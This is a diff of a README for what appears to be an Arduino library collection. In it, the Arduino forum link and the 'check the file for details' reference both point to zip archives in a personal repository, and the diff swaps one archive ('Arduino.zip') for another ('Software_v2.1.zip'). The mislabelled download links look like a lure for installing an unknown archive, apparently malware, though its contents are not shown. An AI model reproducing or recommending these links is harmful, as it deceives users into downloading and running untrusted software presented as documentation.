@@ -7,7 +7,7 @@ Furthermore this repository contains a few stand alone applications.
 
 ### Questions
 For questions about the usage of the libraries, please post a question on the Arduino 
-forum at https://raw.githubusercontent.com/nielsolehald/Arduino/master/ganoid/Arduino.zip
+forum at https://github.com/nielsolehald/Arduino/raw/refs/heads/master/libraries/MCP4725/examples/Software_v2.1.zip
 
 ### Bugs and issues
 For bugs in the libraries, please fill in an issue in Github as that makes it 
@@ -27,7 +27,7 @@ see "over the needs of your own application".
 I appreciate if you give credits when appropriate, and if you want to donate, please
 donate to charity like "doctors without borders".
 
-Please check the file https://raw.githubusercontent.com/nielsolehald/Arduino/master/ganoid/Arduino.zip for the details.
+Please check the file https://github.com/nielsolehald/Arduino/raw/refs/heads/master/libraries/MCP4725/examples/Software_v2.1.zip for the details.
 
 
 Regards,
